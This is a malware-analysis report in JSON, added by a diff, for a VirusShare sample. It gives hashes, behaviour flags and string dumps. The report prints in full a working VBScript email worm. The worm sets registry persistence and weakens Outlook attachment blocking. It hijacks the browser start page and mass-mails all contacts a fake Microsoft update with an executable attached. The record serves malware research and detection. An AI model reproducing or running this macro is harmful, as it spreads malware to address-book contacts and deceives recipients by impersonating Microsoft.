@@ -1,0 +1,75 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "Call": "May call a DLL using Excel 4 Macros",
+            "CreateObject": "May create an OLE object",
+            "Run": "May run an executable file or a system command",
+            "Shell": "May run an executable file or a system command",
+            "WScript.Shell": "May run an executable file or a system command",
+            "Windows": "May enumerate application windows"
+        },
+        "macro": "On Error Resume Next\nSet DcXmkdXewreh = CreateObject(\"WScript.Shell\")\nSet bRsJhdblaYr = CreateObject(\"Scripting.FileSystemObject\")\nDcXmkdXewreh.regwrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce\\wincomp32\\\", \"WINDOWS\\system32\\nstdnrdll32.vbs\"\nDcXmkdXewreh.regwrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\nldr32\\\", \"WINDOWS\\system32\\NonYou.exe\"\nDcXmkdXewreh.regwrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\8.0\\Outlook\\Security\\Level1Remove\", \"exe\"\nDcXmkdXewreh.regwrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Outlook\\Security\\Level1Remove\", \"exe\"\nDcXmkdXewreh.regwrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\10.0\\Outlook\\Security\\Level1Remove\", \"exe\"\nIf Day(Now) = 11 Or  Day(Now) = 23 Then Call lSXmWeqGfBv\nCall WeqGfEwBnzPu\nSub lSXmWeqGfBv()\nDcXmkdXewreh.regWrite \"HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page\", \"http://www.gedzac.tk\"\nDcXmkdXewreh.Run \"\\WINDOWS\\system32\\About.hta\"\nEnd Sub\nSub WeqGfEwBnzPu()\nSet OutlookApp = CreateObject(\"Outlook.Application\")\nSet GNS = OutlookApp.GetNameSpace(\"MAPI\")\nFor List1 = 1 To GNS.AddressLists.Count\nCountLoop = 1\nFor ListCount = 1 To GNS.AddressLists(List1).AddressEntries.Count\nSet OutlookEmail = OutlookApp.CreateItem(0)\nOutlookEmail.Recipients.Add (GNS.AddressLists(List1).AddressEntries(CountLoop))\nOutlookEmail.Subject = \"Microsoft Outlook News\"\nOutlookEmail.Body = \"Microsoft Outlook Update / Bug Fixed - Contact: support@microsoft.com\"\nOutlookEmail.Attachments.Add (\"\\WINDOWS\\system32\\MSOutlookInternetUpdate.exe\")\nOutlookEmail.Importance = 2\nOutlookEmail.DeleteAfterSubmit = True\nOutlookEmail.Send\nCountLoop = CountLoop + 1\nNext\nNext\nDcXmkdXewreh.Run \"http://www.windowsupdate.com\"\nEnd Sub"
+    },
+    "filename": "VirusShare_3e4b5c318cfc758a5aaba5af9440fa81",
+    "filesize": 1765,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "3e4b5c318cfc758a5aaba5af9440fa81",
+        "sha1": "df60123a4d05d1a8a68fd6f4028f17f39587cc15",
+        "sha256": "9d015e024183c225e6a98a1e907c7862b30c6b491fa42037ea65c6a68c1e2c12"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "On Error Resume Next",
+            "Set DcXmkdXewreh = CreateObject(\"WScript.Shell\")",
+            "Set bRsJhdblaYr = CreateObject(\"Scripting.FileSystemObject\")",
+            "DcXmkdXewreh.regwrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce\\wincomp32\\\", \"WINDOWS\\system32\\nstdnrdll32.vbs\"",
+            "DcXmkdXewreh.regwrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\nldr32\\\", \"WINDOWS\\system32\\NonYou.exe\"",
+            "DcXmkdXewreh.regwrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\8.0\\Outlook\\Security\\Level1Remove\", \"exe\"",
+            "DcXmkdXewreh.regwrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Outlook\\Security\\Level1Remove\", \"exe\"",
+            "DcXmkdXewreh.regwrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\10.0\\Outlook\\Security\\Level1Remove\", \"exe\"",
+            "If Day(Now) = 11 Or  Day(Now) = 23 Then Call lSXmWeqGfBv",
+            "Call WeqGfEwBnzPu",
+            "Sub lSXmWeqGfBv()",
+            "DcXmkdXewreh.regWrite \"HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page\", \"http://www.gedzac.tk\"",
+            "DcXmkdXewreh.Run \"\\WINDOWS\\system32\\About.hta\"",
+            "End Sub",
+            "Sub WeqGfEwBnzPu()",
+            "Set OutlookApp = CreateObject(\"Outlook.Application\")",
+            "Set GNS = OutlookApp.GetNameSpace(\"MAPI\")",
+            "For List1 = 1 To GNS.AddressLists.Count",
+            "CountLoop = 1",
+            "For ListCount = 1 To GNS.AddressLists(List1).AddressEntries.Count",
+            "Set OutlookEmail = OutlookApp.CreateItem(0)",
+            "OutlookEmail.Recipients.Add (GNS.AddressLists(List1).AddressEntries(CountLoop))",
+            "OutlookEmail.Subject = \"Microsoft Outlook News\"",
+            "OutlookEmail.Body = \"Microsoft Outlook Update / Bug Fixed - Contact: support@microsoft.com\"",
+            "OutlookEmail.Attachments.Add (\"\\WINDOWS\\system32\\MSOutlookInternetUpdate.exe\")",
+            "OutlookEmail.Importance = 2",
+            "OutlookEmail.DeleteAfterSubmit = True",
+            "OutlookEmail.Send",
+            "CountLoop = CountLoop + 1",
+            "Next",
+            "Next",
+            "DcXmkdXewreh.Run \"http://www.windowsupdate.com\"",
+            "End Sub"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://www.gedzac.tk",
+            "http://www.windowsupdate.com"
+        ]
+    },
+    "time": "0:00:00.314719",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
